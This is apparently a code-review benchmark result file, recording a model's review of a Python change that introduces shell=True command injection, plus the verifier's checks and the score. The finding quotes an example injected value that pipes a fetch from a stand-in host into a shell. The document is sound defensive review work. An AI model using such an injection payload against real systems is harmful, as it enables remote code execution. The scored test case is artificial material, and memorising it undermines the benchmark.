@@ -1,0 +1,92 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "ef19c30e9434",
+  "turns": 3,
+  "tool_calls": null,
+  "seconds": 49.1,
+  "setup_seconds": 0.0,
+  "total_seconds": 49.2,
+  "usage": {
+    "in": 16633,
+    "cache_read": 71296,
+    "cache_write": 0,
+    "out": 2073,
+    "source": "cli"
+  },
+  "cost_usd": 0.0670928,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "critical",
+      "body": "`subprocess.run(..., shell=True)` with an unescaped f-string lets `upload_dir`, `name`, and `oid` be interpreted by the shell. A value such as `name=\"x; curl evil.test/exfil | sh\"` (or metacharacters in `upload_dir` / `oid`) runs arbitrary commands as the service user.\n\nThe prior argv-list form was injection-safe: those strings were one argument each to `/usr/bin/convert`. ImageMagick 7 policy/delegates do not require shell form \u2014 keep the list argv (and absolute binary path), or if you must build a shell command, pass a fixed argv to `convert` only and never interpolate untrusted segments into `shell=True`.\n\n```suggestion\n    subprocess.run(\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n```\n"
+    },
+    {
+      "path": "thumbs.py",
+      "line": 6,
+      "severity": "warning",
+      "body": "The command string calls bare `convert` instead of the previous `/usr/bin/convert`. On a runner or host where PATH can be influenced, a different binary may be executed. Prefer the absolute path (or an explicit env) even if you keep a non-shell invoke."
+    }
+  ],
+  "summary": "## Verdict\n\nThis change introduces a **critical command-injection** vulnerability by switching `subprocess.run` from an argv list to `shell=True` with an unescaped f-string.\n\n## Analysis\n\n`make_thumb` interpolates `upload_dir`, `name`, and `oid` directly into a shell command. Any metacharacter in those values (`;`, `|`, `$(...)`, backticks, spaces, etc.) is interpreted by the shell. The previous argv-list form passed those strings as a single argument to `/usr/bin/convert` and did not invoke a shell, so the same inputs could not run arbitrary commands.\n\nThe new comment claims shell form is required for an ImageMagick 7 policy delegate. ImageMagick policy and delegate handling apply to the `convert` binary itself and do not require `shell=True`. If PATH or policy discovery is the real issue, keep the argv list and point at the correct binary (for example `/usr/bin/convert` or MagickWand), or set env explicitly \u2014 do not hand user-controlled path fragments to a shell.\n\nDropping the absolute path `/usr/bin/convert` for bare `convert` also makes the call PATH-dependent on the runner.\n\n**Recommendation:** request-changes\n",
+  "verification": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The change replaces a safe argv-list `subprocess.run` with `shell=True` and an f-string that interpolates `upload_dir`, `name`, and `oid`, so shell metacharacters in those values execute as the service user. Base used `[\"/usr/bin/convert\", ...]` with no shell, and no remaining upstream validation is"
+    },
+    {
+      "path": "thumbs.py",
+      "line": 6,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "not sampled"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.587,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2432,
+      "out": 376
+    },
+    "cost_usd": 0.008067
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
